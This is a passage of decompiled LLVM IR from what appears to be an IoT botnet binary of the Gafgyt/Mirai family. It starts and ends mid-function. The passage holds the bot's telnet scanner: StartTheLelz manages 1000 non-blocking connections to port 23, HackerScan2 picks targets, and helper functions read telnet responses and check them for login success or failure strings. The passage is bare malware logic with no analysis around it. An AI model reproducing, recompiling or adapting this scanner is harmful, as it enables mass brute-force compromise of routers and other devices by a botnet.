  store i32 %arg3, i32* %v3_dacc, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_dad8 = add i32 %tmp4, 16
  %v3_dad8 = inttoptr i32 %v2_dad8 to i32*
  store i32 %arg2, i32* %v3_dad8, align 4
  store i32 %v3_d9d4, i32* @fp, align 4
  ret i32 %v0_da6c

; uselistorder directives
  uselistorder i32 %v0_da6c, { 1, 2, 0 }
  uselistorder i32 %v3_da64, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_db00 = icmp sgt i32 %arg1, 2
  br i1 %v8_db00, label %dec_label_pc_db10, label %dec_label_pc_db20

dec_label_pc_db10:                                ; preds = %entry
  %v1_db14 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %entry, %dec_label_pc_db10
  %storemerge1 = phi i32 [ 0, %dec_label_pc_db10 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_db20, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_db34 = load i32, i32* @fp, align 4
  %v1_db48 = add i32 %arg1, 4
  %v2_db48 = inttoptr i32 %v1_db48 to i32*
  %v3_db48 = load i32, i32* %v2_db48, align 4
  store i32 %v3_db48, i32* @r0, align 4
  %v1_db54 = call i32 @__GI_inet_ntoa(i32 %v3_db48)
  store i32 %v3_db34, i32* @fp, align 4
  ret i32 %v1_db54
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_db6c = load i32, i32* @fp, align 4
  store i32 56180, i32* %stack_var_-4, align 4
  %v2_db70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_db70, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_db98 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_dbac = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_dbbc = load i8, i8* %arg3, align 1
  %v2_dbc0 = icmp eq i8 %v2_dbbc, -1
  br i1 %v2_dbc0, label %dec_label_pc_dbc8, label %dec_label_pc_dbdc

dec_label_pc_dbc8:                                ; preds = %entry
  %v4_dbd8 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3)
  br label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %entry, %dec_label_pc_dbc8
  %v3_dbe0 = load i32, i32* %stack_var_0, align 4
  %v3_dbe4 = call i32 @contains_string(i32 %tmp, i32 %v3_dbe0)
  %v2_dbec = icmp ne i32 %v3_dbe4, 0
  %. = zext i1 %v2_dbec to i32
  store i32 %v3_db6c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_dbdc, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dc5c.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_dc1c = load i32, i32* @fp, align 4
  store i32 %v3_dc1c, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_dc48 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_dc5c

dec_label_pc_dc5c:                                ; preds = %dec_label_pc_dc5c.lr.ph, %dec_label_pc_dc5c
  %storemerge25 = phi i32 [ 0, %dec_label_pc_dc5c.lr.ph ], [ %v1_dc70, %dec_label_pc_dc5c ]
  %v5_dc68 = mul nuw nsw i32 %storemerge25, 4
  %v6_dc68 = add i32 %v5_dc68, %v2_dc48
  %v7_dc68 = inttoptr i32 %v6_dc68 to i32*
  store i32 0, i32* %v7_dc68, align 4
  %v1_dc70 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_dc70, 32
  br i1 %tmp21, label %dec_label_pc_dc5c, label %dec_label_pc_dc84

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dc5c
  %v13_dc1c = ptrtoint i32* %stack_var_-16 to i32
  %v3_dc88 = udiv i32 %arg1, 32
  %v3_dc94 = mul nuw nsw i32 %v3_dc88, 4
  %v2_dc9c = add nsw i32 %v3_dc94, -136
  %v2_dca0 = add i32 %v2_dc9c, %v13_dc1c
  %v1_dca4 = inttoptr i32 %v2_dca0 to i32*
  %v2_dca4 = load i32, i32* %v1_dca4, align 4
  %v1_dcac = urem i32 %arg1, 32
  %v6_dcb4 = shl i32 1, %v1_dcac
  %v2_dcb8 = or i32 %v2_dca4, %v6_dcb4
  store i32 %v2_dcb8, i32* %v1_dca4, align 4
  %v1_dcd8 = add i32 %arg1, 1
  %v2_dce0 = ptrtoint i32* %stack_var_-160 to i32
  %v5_dcf4 = call i32 @__libc_select(i32 %v1_dcd8, i32 %v2_dc48, i32 0, i32 0, i32 %v2_dce0)
  %v5_dd00 = icmp sgt i32 %v5_dcf4, 0
  br i1 %v5_dd00, label %dec_label_pc_dd10, label %dec_label_pc_dd04

dec_label_pc_dd04:                                ; preds = %dec_label_pc_dc84
  br label %dec_label_pc_dd30

dec_label_pc_dd10:                                ; preds = %dec_label_pc_dc84
  %v5_dd24 = inttoptr i32 %arg3 to i32*
  %v6_dd24 = call i32 @__libc_recv(i32 %arg1, i32* %v5_dd24, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dd30

dec_label_pc_dd30:                                ; preds = %dec_label_pc_dd04, %dec_label_pc_dd10
  %storemerge = phi i32 [ %v6_dd24, %dec_label_pc_dd10 ], [ 0, %dec_label_pc_dd04 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_dc48, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_dd30, { 1, 0 }
  uselistorder label %dec_label_pc_dc5c, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_dd44 = load i32, i32* @fp, align 4
  %v3_dd5c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_28794.483 to i32))
  store i32 %v3_dd44, i32* @fp, align 4
  ret i32 %v3_dd5c
}

define i32 @contains_fail(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_dd74 = load i32, i32* @fp, align 4
  %v3_dd8c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_28774.492 to i32))
  store i32 %v3_dd74, i32* @fp, align 4
  ret i32 %v3_dd8c

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_ddd0, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_ddd4, %dec_label_pc_ddd0 ]
  %v1_ddd4 = add i32 %stack_var_-24.0, 1
  %v3_dde0 = mul i32 %v1_ddd4, 4
  %v2_ddec = add i32 %v3_dde0, %arg2
  %v1_ddf0 = inttoptr i32 %v2_ddec to i32*
  %v2_ddf0 = load i32, i32* %v1_ddf0, align 4
  %v2_ddf4 = icmp eq i32 %v2_ddf0, 0
  br i1 %v2_ddf4, label %dec_label_pc_de50.preheader, label %dec_label_pc_ddd0

dec_label_pc_de50.preheader:                      ; preds = %dec_label_pc_ddd0
  %v3_de28 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_de50

dec_label_pc_de08:                                ; preds = %dec_label_pc_de50
  %v3_de0c = mul i32 %storemerge2, 4
  %v2_de18 = add i32 %v3_de0c, %arg2
  %v1_de1c = inttoptr i32 %v2_de18 to i32*
  %v2_de1c = load i32, i32* %v1_de1c, align 4
  %v4_de28 = call i32 @strcasestr(i8* %v3_de28, i32 %v2_de1c, i32 %v3_de0c)
  %v2_de30 = icmp eq i32 %v4_de28, 0
  %v1_de48 = add nuw i32 %storemerge2, 1
  br i1 %v2_de30, label %dec_label_pc_de50, label %dec_label_pc_de68

dec_label_pc_de50:                                ; preds = %dec_label_pc_de08, %dec_label_pc_de50.preheader
  %storemerge2 = phi i32 [ %v1_de48, %dec_label_pc_de08 ], [ 0, %dec_label_pc_de50.preheader ]
  %v5_de5c = icmp slt i32 %storemerge2, %v1_ddd4
  br i1 %v5_de5c, label %dec_label_pc_de08, label %dec_label_pc_de68

dec_label_pc_de68:                                ; preds = %dec_label_pc_de50, %dec_label_pc_de08
  %storemerge3 = phi i32 [ 1, %dec_label_pc_de08 ], [ 0, %dec_label_pc_de50 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_ddd4, { 1, 0, 2 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_de78 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_de78, i32* %ip.global-to-local, align 4
  %v3_de7c = load i32, i32* @r4, align 4
  store i32 %v3_de7c, i32* %stack_var_-24, align 4
  store i32 56964, i32* %stack_var_-4, align 4
  %v2_de80 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_de80, i32* @fp, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_dea4 = call i32 @__GI_time(i32* null)
  store i32 %v2_dea4, i32* %r3.global-to-local, align 4
  store i32 %v2_dea4, i32* @r4, align 4
  %v0_deb0 = call i32 @rand_cmwc()
  %v0_deb8 = load i32, i32* @r4, align 4
  %v2_deb8 = xor i32 %v0_deb8, %v0_deb0
  store i32 %v2_deb8, i32* %r3.global-to-local, align 4
  %v1_dec0 = call i32 @srand(i32 %v2_deb8)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-616, align 4
  %v1_ded8 = call i32 @htons(i32 23)
  %v2_def0 = ptrtoint i32* %stack_var_-608 to i32
  store i32 %v2_def0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-608, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_df0c = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_df34 = inttoptr i32 %v1_df0c to i8*
  %v3_df34 = call i32 @__GI_memset(i8* %v2_df34, i32 0)
  %v1_df58 = load i32, i32* @sp, align 4
  %v1_df68 = add i32 %v1_df58, -27997
  %v3_df6c = and i32 %v1_df68, -4
  store i32 5000, i32* %r3.global-to-local, align 4
  store i32 5000, i32* @r2, align 4
  %v2_dfa4 = inttoptr i32 %v3_df6c to i8*
  %v3_dfa4 = call i32 @__GI_memset(i8* %v2_dfa4, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dfb4

dec_label_pc_dfb4:                                ; preds = %entry, %dec_label_pc_dfb4
  %storemerge514 = phi i32 [ 0, %entry ], [ %v1_e070, %dec_label_pc_dfb4 ]
  %v2_dfc4 = mul nuw nsw i32 %storemerge514, 28
  %v2_dfc8 = add i32 %v2_dfc4, %v3_df6c
  store i32 %v2_dfc8, i32* %r3.global-to-local, align 4
  %v2_dfd0 = inttoptr i32 %v2_dfc8 to i32*
  store i32 0, i32* %v2_dfd0, align 4
  %v0_dfd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dfd4 = add i32 %v0_dfd4, 4
  store i32 %v1_dfd4, i32* %r3.global-to-local, align 4
  %v2_dfdc = inttoptr i32 %v1_dfd4 to i32*
  store i32 0, i32* %v2_dfdc, align 4
  %v0_dfe0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dfe0 = add i32 %v0_dfe0, 4
  store i32 %v1_dfe0, i32* %r3.global-to-local, align 4
  %v2_dfe8 = inttoptr i32 %v1_dfe0 to i32*
  store i32 0, i32* %v2_dfe8, align 4
  %v0_dfec = load i32, i32* %r3.global-to-local, align 4
  %v1_dfec = add i32 %v0_dfec, 4
  store i32 %v1_dfec, i32* %r3.global-to-local, align 4
  %v2_dff4 = inttoptr i32 %v1_dfec to i32*
  store i32 0, i32* %v2_dff4, align 4
  %v0_dff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dff8 = add i32 %v0_dff8, 4
  store i32 %v1_dff8, i32* %r3.global-to-local, align 4
  %v2_e000 = inttoptr i32 %v1_dff8 to i32*
  store i32 0, i32* %v2_e000, align 4
  %v0_e004 = load i32, i32* %r3.global-to-local, align 4
  %v1_e004 = add i32 %v0_e004, 4
  store i32 %v1_e004, i32* %r3.global-to-local, align 4
  %v2_e00c = inttoptr i32 %v1_e004 to i32*
  store i32 0, i32* %v2_e00c, align 4
  %v0_e010 = load i32, i32* %r3.global-to-local, align 4
  %v1_e010 = add i32 %v0_e010, 4
  %v2_e018 = inttoptr i32 %v1_e010 to i32*
  store i32 0, i32* %v2_e018, align 4
  %v3_e040 = add i32 %v2_dfc8, 9
  %v4_e040 = inttoptr i32 %v3_e040 to i8*
  store i8 1, i8* %v4_e040, align 1
  %v2_e060 = add i32 %v2_dfc8, 24
  %v2_e068 = inttoptr i32 %v2_e060 to i32*
  store i32 %v1_df0c, i32* %v2_e068, align 4
  %v1_e070 = add nuw nsw i32 %storemerge514, 1
  store i32 %v1_e070, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v5_e084 = icmp slt i32 %v1_e070, 1000
  br i1 %v5_e084, label %dec_label_pc_dfb4, label %dec_label_pc_e088.preheader

dec_label_pc_e088.preheader:                      ; preds = %dec_label_pc_dfb4
  %v19_de7c = ptrtoint i32* %stack_var_-24 to i32
  %v2_e110 = add i32 %v3_df6c, 8
  %v2_e444 = add i32 %v3_df6c, 4
  %v3_e534 = bitcast i32* %stack_var_-616 to %sockaddr*
  %v2_e5fc = ptrtoint i32* %stack_var_-328 to i32
  %v2_e6f8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e754 = ptrtoint i32* %stack_var_-344 to i32
  %v2_e758 = ptrtoint i32* %stack_var_-340 to i32
  %v2_e8c4 = add i32 %v3_df6c, 24
  %v2_f42c = add i32 %v3_df6c, 16
  br label %dec_label_pc_e088

dec_label_pc_e088:                                ; preds = %dec_label_pc_f660, %dec_label_pc_e088.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e094

dec_label_pc_e094:                                ; preds = %dec_label_pc_e088, %dec_label_pc_f660
  %storemerge612 = phi i32 [ 0, %dec_label_pc_e088 ], [ %v1_f664, %dec_label_pc_f660 ]
  %v3_e0a0 = mul i32 %storemerge612, 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e0a8 = mul nuw nsw i32 %storemerge612, 28
  %v2_e0ac = add i32 %v2_e0a8, %v3_df6c
  %v2_e0b0 = add i32 %v2_e0ac, 16
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v1_e0b4 = inttoptr i32 %v2_e0b0 to i32*
  %v2_e0b4 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_e0b4, i32* %r3.global-to-local, align 4
  %v2_e0b8 = icmp eq i32 %v2_e0b4, 0
  br i1 %v2_e0b8, label %dec_label_pc_e0c0, label %dec_label_pc_e0f8

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e094
  store i32 %storemerge612, i32* @r4, align 4
  %v2_e0c8 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e0dc = load i32, i32* @r4, align 4
  %v3_e0e0 = mul i32 %v0_e0dc, 4
  store i32 %v3_e0e0, i32* %r2.global-to-local, align 4
  %v2_e0e8 = mul i32 %v0_e0dc, 28
  %v2_e0f0 = add i32 %v2_f42c, %v2_e0e8
  store i32 %v2_e0f0, i32* %r3.global-to-local, align 4
  %v2_e0f4 = inttoptr i32 %v2_e0f0 to i32*
  store i32 %v2_e0c8, i32* %v2_e0f4, align 4
  br label %dec_label_pc_e0f8

dec_label_pc_e0f8:                                ; preds = %dec_label_pc_e094, %dec_label_pc_e0c0
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e114 = add i32 %v2_e110, %v2_e0a8
  store i32 %v2_e114, i32* %r3.global-to-local, align 4
  %v1_e118 = inttoptr i32 %v2_e114 to i8*
  %v2_e118 = load i8, i8* %v1_e118, align 4
  %v3_e118 = sext i8 %v2_e118 to i32
  %v4_e118 = zext i8 %v2_e118 to i32
  store i32 %v4_e118, i32* %r3.global-to-local, align 4
  switch i32 %v3_e118, label %dec_label_pc_f660 [
    i32 0, label %dec_label_pc_e148
    i32 1, label %dec_label_pc_e610.lr.ph
    i32 2, label %dec_label_pc_ea44
    i32 3, label %dec_label_pc_ebc8
    i32 4, label %dec_label_pc_ed80
    i32 5, label %dec_label_pc_ef04
    i32 6, label %dec_label_pc_f0bc
    i32 7, label %dec_label_pc_f4a4
  ]

dec_label_pc_e148:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e164 = add i32 %v2_e0ac, 8
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v1_e168 = add i32 %v2_e0ac, 9
  %v2_e168 = inttoptr i32 %v1_e168 to i8*
  %v3_e168 = load i8, i8* %v2_e168, align 1
  %v7_e16c = icmp eq i8 %v3_e168, 1
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v7_e16c, label %dec_label_pc_e174, label %dec_label_pc_e260

dec_label_pc_e174:                                ; preds = %dec_label_pc_e148
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e190 = add i32 %v2_e0ac, 24
  store i32 %v2_e190, i32* %r3.global-to-local, align 4
  %v1_e194 = inttoptr i32 %v2_e190 to i32*
  %v2_e194 = load i32, i32* %v1_e194, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e1b8 = inttoptr i32 %v2_e0ac to i32*
  store i32 0, i32* %v2_e1b8, align 4
  %v0_e1bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e1bc = add i32 %v0_e1bc, 4
  store i32 %v1_e1bc, i32* %r3.global-to-local, align 4
  %v2_e1c4 = inttoptr i32 %v1_e1bc to i32*
  store i32 0, i32* %v2_e1c4, align 4
  %v0_e1c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1c8 = add i32 %v0_e1c8, 4
  store i32 %v1_e1c8, i32* %r3.global-to-local, align 4
  %v2_e1d0 = inttoptr i32 %v1_e1c8 to i32*
  store i32 0, i32* %v2_e1d0, align 4
  %v0_e1d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1d4 = add i32 %v0_e1d4, 4
  store i32 %v1_e1d4, i32* %r3.global-to-local, align 4
  %v2_e1dc = inttoptr i32 %v1_e1d4 to i32*
  store i32 0, i32* %v2_e1dc, align 4
  %v0_e1e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1e0 = add i32 %v0_e1e0, 4
  store i32 %v1_e1e0, i32* %r3.global-to-local, align 4
  %v2_e1e8 = inttoptr i32 %v1_e1e0 to i32*
  store i32 0, i32* %v2_e1e8, align 4
  %v0_e1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_e1ec = add i32 %v0_e1ec, 4
  store i32 %v1_e1ec, i32* %r3.global-to-local, align 4
  %v2_e1f4 = inttoptr i32 %v1_e1ec to i32*
  store i32 0, i32* %v2_e1f4, align 4
  %v0_e1f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1f8 = add i32 %v0_e1f8, 4
  %v2_e200 = inttoptr i32 %v1_e1f8 to i32*
  store i32 0, i32* %v2_e200, align 4
  store i32 %v2_e190, i32* %r2.global-to-local, align 4
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  store i32 %v2_e194, i32* %v1_e194, align 4
  store i32 %storemerge612, i32* @r4, align 4
  %v1_e230 = call i32 @HackerScan2(i32 24)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e240 = load i32, i32* @r4, align 4
  %v3_e244 = mul i32 %v0_e240, 4
  store i32 %v3_e244, i32* %r2.global-to-local, align 4
  %v2_e24c = mul i32 %v0_e240, 28
  %v2_e254 = add i32 %v2_e444, %v2_e24c
  store i32 %v2_e254, i32* %r3.global-to-local, align 4
  %v2_e258 = inttoptr i32 %v2_e254 to i32*
  store i32 %v1_e230, i32* %v2_e258, align 4
  br label %dec_label_pc_e3ec

dec_label_pc_e260:                                ; preds = %dec_label_pc_e148
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v3_e280 = load i8, i8* %v2_e168, align 1
  %v4_e280 = zext i8 %v3_e280 to i32
  store i32 %v4_e280, i32* %r3.global-to-local, align 4
  %v2_e284 = icmp eq i8 %v3_e280, 0
  br i1 %v2_e284, label %dec_label_pc_e28c, label %dec_label_pc_e3ec

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e260
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v1_e2b0 = add i32 %v2_e0ac, 11
  %v2_e2b0 = inttoptr i32 %v1_e2b0 to i8*
  %v3_e2b0 = load i8, i8* %v2_e2b0, align 1
  %v1_e2b4 = add i8 %v3_e2b0, 1
  store i8 %v1_e2b4, i8* %v2_e2b0, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v1_e308 = add i32 %v2_e0ac, 10
  %v2_e308 = inttoptr i32 %v1_e308 to i8*
  %v3_e308 = load i8, i8* %v2_e308, align 2
  %v1_e30c = add i8 %v3_e308, 1
  store i32 %v3_df6c, i32* %ip.global-to-local, align 4
  store i8 %v1_e30c, i8* %v2_e308, align 2
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v3_e35c = load i8, i8* %v2_e2b0, align 1
  %v7_e360 = icmp eq i8 %v3_e35c, 3
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  br i1 %v7_e360, label %dec_label_pc_e368, label %dec_label_pc_e394

dec_label_pc_e368:                                ; preds = %dec_label_pc_e28c
  store i32 %v2_e164, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e168, align 1
  br label %dec_label_pc_f660

dec_label_pc_e394:                                ; preds = %dec_label_pc_e28c
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v3_e3b4 = load i8, i8* %v2_e308, align 2
  %v4_e3b4 = zext i8 %v3_e3b4 to i32
  store i32 %v4_e3b4, i32* %r3.global-to-local, align 4
  %v7_e3b8 = icmp eq i8 %v3_e3b4, 3
  br i1 %v7_e3b8, label %dec_label_pc_e3c0, label %dec_label_pc_e3ec

dec_label_pc_e3c0:                                ; preds = %dec_label_pc_e394
  store i32 %v2_e164, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e168, align 1
  br label %dec_label_pc_f660

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e394, %dec_label_pc_e260, %dec_label_pc_e174
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-616, align 4
  %v1_e400 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-608, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e448 = add i32 %v2_e444, %v2_e0a8
  store i32 %v2_e448, i32* %r3.global-to-local, align 4
  %v1_e44c = inttoptr i32 %v2_e448 to i32*
  %v2_e44c = load i32, i32* %v1_e44c, align 4
  store i32 %v2_e44c, i32* %r3.global-to-local, align 4
  store i32 %storemerge612, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_e464 = call i32 @socket()
  %v0_e46c = load i32, i32* @r4, align 4
  %v2_e478 = mul i32 %v0_e46c, 28
  %v2_e47c = add i32 %v2_e478, %v3_df6c
  %v2_e480 = inttoptr i32 %v2_e47c to i32*
  store i32 %v0_e464, i32* %v2_e480, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_e49c = inttoptr i32 %v2_e0ac to i32*
  %v2_e49c = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e49c, i32* %r3.global-to-local, align 4
  %v7_e4a0 = icmp eq i32 %v2_e49c, -1
  br i1 %v7_e4a0, label %dec_label_pc_f660, label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e3ec
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e4c0 = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e4c0, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e4dc = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e4dc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e4ec = call i32 @__libc_fcntl(i32 %v2_e4dc, i32 3)
  %v1_e4f4 = or i32 %v2_e4ec, 2048
  store i32 %v1_e4f4, i32* %r3.global-to-local, align 4
  %v0_e4f8 = load i32, i32* @r4, align 4
  store i32 %v1_e4f4, i32* @r2, align 4
  %v2_e504 = call i32 @__libc_fcntl(i32 %v0_e4f8, i32 4)
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e520 = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e520, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_e534 = call i32 @__libc_connect(i32 %v2_e520, %sockaddr* nonnull %v3_e534, i32 16)
  store i32 %v4_e534, i32* %r3.global-to-local, align 4
  %v3_e53c = icmp eq i32 %v4_e534, -1
  br i1 %v3_e53c, label %dec_label_pc_e544, label %dec_label_pc_e5a8

dec_label_pc_e544:                                ; preds = %dec_label_pc_e4a8
  %v0_e544 = call i32 @__errno_location()
  store i32 %v0_e544, i32* %r3.global-to-local, align 4
  %v1_e54c = inttoptr i32 %v0_e544 to i32*
  %v2_e54c = load i32, i32* %v1_e54c, align 4
  store i32 %v2_e54c, i32* %r3.global-to-local, align 4
  %v7_e550 = icmp eq i32 %v2_e54c, 115
  br i1 %v7_e550, label %dec_label_pc_e5a8, label %dec_label_pc_e558

dec_label_pc_e558:                                ; preds = %dec_label_pc_e544
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e570 = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e570, i32* %r3.global-to-local, align 4
  %v3_e578 = call i32 @sclose(i32 %v2_e570, i32 %v3_df6c, i32 %v3_e0a0)
  store i32 %v2_e164, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e168, align 1
  br label %dec_label_pc_f660

dec_label_pc_e5a8:                                ; preds = %dec_label_pc_e4a8, %dec_label_pc_e544
  %v3_e5cc = inttoptr i32 %v2_e164 to i8*
  store i8 1, i8* %v3_e5cc, align 4
  store i32 %v2_e0b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %v1_e0b4, align 4
  br label %dec_label_pc_f660

dec_label_pc_e610.lr.ph:                          ; preds = %dec_label_pc_e0f8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e610

dec_label_pc_e610:                                ; preds = %dec_label_pc_e610.lr.ph, %dec_label_pc_e610
